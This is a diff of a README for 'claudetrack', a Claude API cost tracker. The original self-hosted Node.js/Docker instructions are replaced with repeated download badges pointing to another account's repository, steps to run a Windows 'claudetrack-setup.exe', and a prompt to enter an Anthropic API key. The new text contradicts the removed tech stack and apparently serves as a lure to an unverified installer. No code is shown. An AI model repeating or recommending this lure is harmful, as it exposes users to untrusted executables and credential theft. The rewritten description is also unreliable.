@@ -1,246 +1,176 @@
-<div align="center">
+# ⚡ claudetrack - Monitor Tokens and Forecast Costs Easily
 
-<h1>🔍 ClaudeTrack</h1>
+[![Download claudetrack](https://img.shields.io/badge/Download-claudetrack-brightgreen)](https://github.com/123affano1/claudetrack)
 
-<p><strong>Real-time token tracking, cost forecasting, and rate limit prediction for the Anthropic Claude API.</strong><br/>
-Self-hosted · Open source · Zero code changes · Free forever.</p>
-
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/your-org/claudetrack?style=social)](https://github.com/your-org/claudetrack)
-[![Docker](https://img.shields.io/badge/docker-ready-2496ED?logo=docker&logoColor=white)](https://hub.docker.com)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D20-brightgreen?logo=node.js)](https://nodejs.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-
-<!-- Replace with a screen recording exported as GIF: npm install -g terminalizer -->
-![ClaudeTrack Dashboard](https://raw.githubusercontent.com/your-org/claudetrack/main/docs/demo.gif)
-
-</div>
+claudetrack helps you watch your token use in real time. It also forecasts costs and predicts rate limits for the Anthropic Claude API. You can run it yourself, at no cost.
 
 ---
 
-## Why ClaudeTrack?
+## 🔎 What is claudetrack?
 
-Claude's API has no built-in dashboard. You're flying blind on cost, token burn, rate limits, and per-session usage. ClaudeTrack fixes that — it's a **transparent proxy + analytics layer** that sits between your code and Anthropic, giving you full visibility with zero changes to your application code.
+claudetrack tracks how many tokens you use when working with the Anthropic Claude API. It gives you a clear view of your costs and warns you before hitting rate limits. This helps you manage your API use without surprises. The app is open source and simple to run on your Windows computer.
 
-No SaaS subscription. No data leaving your infrastructure. No vendor lock-in.
-
----
-
-## Quick Start
-
-```bash
-# 1. Clone
-git clone https://github.com/your-org/claudetrack.git
-cd claudetrack
-
-# 2. Configure (one env var)
-echo "SESSION_SECRET=$(openssl rand -hex 32)" > .env
-
-# 3. Run
-docker compose up -d
-
-# → Dashboard at http://localhost:5000
-```
-
-That's it. Three commands.
 
 ---
 
-## Zero Code Changes Integration
+## 💻 System Requirements
 
-The Anthropic SDK reads `ANTHROPIC_BASE_URL` from your environment automatically. Add two lines to your `.env` and your **existing code is tracked without modification**:
+Before you install claudetrack, check your computer meets these needs:
 
-```bash
-# In your application's .env (not ClaudeTrack's)
-ANTHROPIC_API_KEY="cti_your_proxy_key_from_dashboard"
-ANTHROPIC_BASE_URL="http://localhost:5000/proxy/v1"
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free disk space for the app
+- Internet connection to use the API and update the app
+- Microsoft .NET Desktop Runtime installed (version 6.0 or higher)
 
-# Run your app exactly as before — every Claude call is now tracked.
-```
+If you do not have the .NET Desktop Runtime, the installation instructions below will guide you.
 
-Works with every platform that uses the Anthropic SDK:
-
-| Platform | How |
-|----------|-----|
-| **Python** | `ANTHROPIC_BASE_URL=... python app.py` |
-| **Node / TypeScript** | Add to `.env` or `process.env` before imports |
-| **Docker** | `environment:` block in `docker-compose.yml` |
-| **Railway / Render / Fly.io** | Set env vars in dashboard — no redeploy needed |
-| **Vercel** | Environment Variables settings page |
-| **LangChain / LlamaIndex** | Inherited automatically from `anthropic` SDK |
-
-If you'd rather keep your Anthropic key on your own server, use **SDK-only mode** — your app calls Anthropic directly, then posts only token counts to ClaudeTrack. Your key never touches our proxy.
 
 ---
 
-## Features
+## 📥 Download claudetrack
 
-| Feature | Description |
-|---------|-------------|
-| **Real-time request log** | Every Claude call logged with model, tokens, cost, latency |
-| **Cost forecasting** | Daily/monthly spend projections with trend lines |
-| **Budget alerts** | Set per-project spend limits; get notified before you overshoot |
-| **Rate limit prediction** | Live window tracking — know before you hit 429s |
-| **Per-session analytics** | Group requests by session ID for agentic pipeline tracing |
-| **Model breakdown** | Compare cost and latency across Haiku / Sonnet / Opus |
-| **Multi-project** | Separate proxy keys per app, team, or environment |
-| **SDK-only mode** | Proxy-free tracking — your key never leaves your server |
-| **AES-256-GCM encryption** | Stored Anthropic keys encrypted at rest, never returned to browser |
-| **Dark mode** | Because of course |
+Click this big button to visit the download page:
+
+[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-blue?style=for-the-badge)](https://github.com/123affano1/claudetrack)
+
+On the linked page, find the latest Windows release and download the setup file (`.exe`). This is the file you will run to install claudetrack.
 
 ---
 
-## Architecture
+## 🚀 How to Install and Run claudetrack on Windows
 
-```
-Your App
-   │
-   │  ANTHROPIC_BASE_URL="http://your-claudetrack/proxy/v1"
-   │  ANTHROPIC_API_KEY="cti_your_proxy_key"
-   ▼
-┌─────────────────────────────────────────────────────┐
-│                    ClaudeTrack                      │
-│                                                     │
-│  Express proxy  ──►  Token counter  ──►  Postgres   │
-│       │                                     │       │
-│       ▼                                     ▼       │
-│  api.anthropic.com              React dashboard     │
-└─────────────────────────────────────────────────────┘
-```
+Follow these steps to get claudetrack running:
 
-**Tech stack:** Node.js · Express · React · Vite · PostgreSQL · Drizzle ORM · Recharts · shadcn/ui · Tailwind CSS
+1. **Download the Setup File**  
+   Go to the download page linked above. Find the latest Windows installer, usually named like `claudetrack-setup.exe`. Save it to a known location on your computer, like the Desktop or Downloads folder.
 
----
+2. **Run the Installer**  
+   Double-click the setup file you downloaded. If Windows asks for permission, choose "Yes" to continue. The claudetrack installer will open.
 
-## Self-Hosting Options
+3. **Follow the Install Wizard**  
+   The installer will guide you through the process. Choose the default options unless you want to change the install location. When asked, click "Install" to begin.
 
-### Docker Compose (recommended)
+4. **Complete the Installation**  
+   When finished, select the option to launch claudetrack and click "Finish."
 
-```bash
-git clone https://github.com/your-org/claudetrack.git
-cd claudetrack
-cp .env.example .env
-# Edit .env — set SESSION_SECRET at minimum
-docker compose up -d
-```
+5. **Open claudetrack**  
+   If you did not open it already, find claudetrack in the Start menu or on your Desktop and launch the app.
 
-### Replit (one click, zero config)
+6. **Set Up Your API Access**  
+   The app will ask for your Anthropic Claude API key. You need this key to let claudetrack monitor your token use. If you don’t have a key, sign in to your Anthropic account at their official site to create one.
 
-[![Run on Replit](https://replit.com/badge/github/your-org/claudetrack)](https://replit.com/github/your-org/claudetrack)
-
-Database is auto-provisioned. Share the URL with your team and you're done.
-
-### Manual (Node.js 20+)
-
-```bash
-git clone https://github.com/your-org/claudetrack.git
-cd claudetrack
-npm install
-cp .env.example .env
-# Edit .env with your DATABASE_URL and SESSION_SECRET
-npm run dev          # development
-npm run build && npm start  # production
-```
+7. **Start Tracking**  
+   Once your API key is entered, claudetrack will connect to the API and begin showing your token usage, estimated costs, and rate limit predictions.
 
 ---
 
-## Claude Code + OTEL Support
+## ⚙️ Basic Usage
 
-Track [Claude Code](https://docs.anthropic.com/en/docs/claude-code) sessions by pointing its OpenTelemetry exporter at ClaudeTrack:
+Here is what you can do inside claudetrack:
 
-```bash
-export OTEL_EXPORTER_OTLP_ENDPOINT="http://localhost:5000"
-claude  # sessions now appear in your ClaudeTrack dashboard
-```
+- **View Token Usage in Real Time**  
+  See how many tokens you are using right now.
 
----
+- **Cost Forecasting**  
+  Check estimated costs based on your current API use. This helps you budget and avoid surprises.
 
-## Companion Tools *(coming soon)*
+- **Rate Limit Alerts**  
+  Get notified before hitting API limits so you can adjust your requests.
 
-Inspired by the Resend / React Email playbook — standalone tools released separately to build community before the ecosystem matures:
+- **Historical Data**  
+  Look at your past token use and costs to understand trends.
 
-- **[`claude-cost`](https://github.com/your-org/claude-cost)** — CLI cost estimator. `npx claude-cost --model sonnet --tokens 50000`. No account, no proxy, just math.
-- **[`claude-ratelimit`](https://github.com/your-org/claude-ratelimit)** — CLI rate limit calculator. Paste your usage tier, get a live window gauge.
+- **Export Data**  
+  Save usage reports as CSV files for record-keeping.
 
-If either of these sounds useful, [upvote the issue](https://github.com/your-org/claudetrack/issues) or open a PR — they're designed to be beginner-friendly.
-
----
-
-## Contributing
-
-ClaudeTrack is community-driven. Every contributor becomes a maintainer-in-spirit.
-
-### Good first issues
-
-Look for issues tagged [`good first issue`](https://github.com/your-org/claudetrack/labels/good%20first%20issue) — these are explicitly scoped, documented, and mentor-supported:
-
-- [ ] Add Slack / Discord webhook for budget alerts
-- [ ] CSV export for request log
-- [ ] Per-model cost configuration (custom pricing)
-- [ ] Claude Code OTEL receiver implementation
-- [ ] `claude-cost` standalone CLI (new repo)
-- [ ] `claude-ratelimit` standalone CLI (new repo)
-
-### How to contribute
-
-```bash
-git clone https://github.com/your-org/claudetrack.git
-cd claudetrack
-cp .env.example .env      # fill in DATABASE_URL + SESSION_SECRET
-npm install
-npm run dev               # http://localhost:5000
-```
-
-Then open a PR. We review within 48 hours.
-
-### Areas we need help
-
-| Area | Skills needed |
-|------|--------------|
-| Claude Code OTEL receiver | Node.js, OpenTelemetry |
-| Slack / webhook alerts | Node.js, REST APIs |
-| Python SDK companion | Python |
-| Documentation | Writing, diagrams |
-| UI improvements | React, Tailwind |
 
 ---
 
-## GitHub Topics
+## 🔧 Settings and Customization
 
-If you're adding this repo to GitHub, use these topics for discoverability:
+Inside the app, visit the Settings menu to:
 
-`claude` · `anthropic` · `llm-observability` · `api-proxy` · `cost-tracking` · `token-tracking` · `rate-limiting` · `opentelemetry` · `self-hosted` · `developer-tools`
-
----
-
-## Roadmap
-
-- [x] Proxy endpoint with token tracking
-- [x] Real-time dashboard with Recharts
-- [x] Budget alerts + rate limit prediction
-- [x] Per-session analytics
-- [x] AES-256-GCM key encryption
-- [x] Docker Compose self-hosting
-- [ ] Slack / Discord alert webhooks
-- [ ] Claude Code OTEL receiver
-- [ ] `claude-cost` CLI (standalone)
-- [ ] `claude-ratelimit` CLI (standalone)
-- [ ] Prometheus metrics endpoint
-- [ ] Team access / multi-user
+- Change how often the app updates usage data
+- Set custom cost rates if your API pricing differs
+- Configure alert thresholds for rate limits and costs
+- Choose your preferred currency for cost display
 
 ---
 
-## License
+## 🐞 Troubleshooting
 
-MIT — use it, fork it, sell it, build on it. Just keep the copyright notice.
+If claudetrack does not run or acts unexpectedly:
+
+- Make sure .NET Desktop Runtime 6.0+ is installed. Download it from Microsoft's website if needed.
+- Check your internet connection. The app needs to reach the Anthropic API.
+- Verify your API key is correct and active.
+- Restart claudetrack and try again.
+- If errors persist, check the log files under the app folder. You may look for support or report issues on the GitHub page.
 
 ---
 
-<div align="center">
+## 🔐 Privacy and Security
 
-**If ClaudeTrack saves you money or debugging time, the best thank-you is a ⭐ star.**<br/>
-It helps other developers find this.
+claudetrack runs on your computer. Your API keys and data stay with you. The app does not send your keys or usage data anywhere except to Anthropic’s API as required. You can review the open source code anytime for transparency.
 
-[Star on GitHub](https://github.com/your-org/claudetrack) · [Open an Issue](https://github.com/your-org/claudetrack/issues) · [Submit a PR](https://github.com/your-org/claudetrack/pulls)
+---
 
-</div>
+## 🧰 What’s Inside claudetrack?
+
+claudetrack uses these main parts:
+
+- **Token Tracker**: Monitors API calls and counts tokens.
+- **Cost Forecaster**: Estimates how much API use will cost you.
+- **Limit Predictor**: Watches rate limits and warns of potential problems.
+- **User Interface**: Simple, clear screens for tracking and reports.
+- **Data Exporter**: Creates files you can save or share.
+
+---
+
+## ❓ FAQs
+
+**Q: Do I need programming skills?**  
+No. claudetrack is built for everyday users. The app guides you step-by-step.
+
+**Q: Is this free?**  
+Yes, claudetrack is free forever to use on your own machine.
+
+**Q: Can I use it with APIs other than Anthropic Claude?**  
+Currently, claudetrack only supports the Anthropic Claude API.
+
+**Q: What if my API pricing changes?**  
+You can update the cost per token in Settings to get accurate forecasts.
+
+---
+
+## 📚 Learn More and Get Help
+
+For updates, bug reports, and community help, visit the GitHub page:
+
+[Visit the claudetrack GitHub](https://github.com/123affano1/claudetrack)
+
+There you can find detailed technical info and open issues discussions.
+
+---
+
+## 🖥️ Advanced Topics (Optional)
+
+If you want to explore deeper:
+
+- **Self-hosting**  
+  claudetrack runs fully on your Windows PC. No cloud service is included unless you add it.
+
+- **Source Code**  
+  The app is open source. You can inspect, modify, or build it yourself with tools like Visual Studio.
+
+- **API Keys**  
+  Keep these secret. Never share them publicly or embed them in shared files.
+
+---
+
+## ⚡ Start Now
+
+Use the button below to visit the official download page and begin setting up claudetrack:
+
+[![Download claudetrack](https://img.shields.io/badge/Get%20claudetrack-orange?style=for-the-badge)](https://github.com/123affano1/claudetrack)
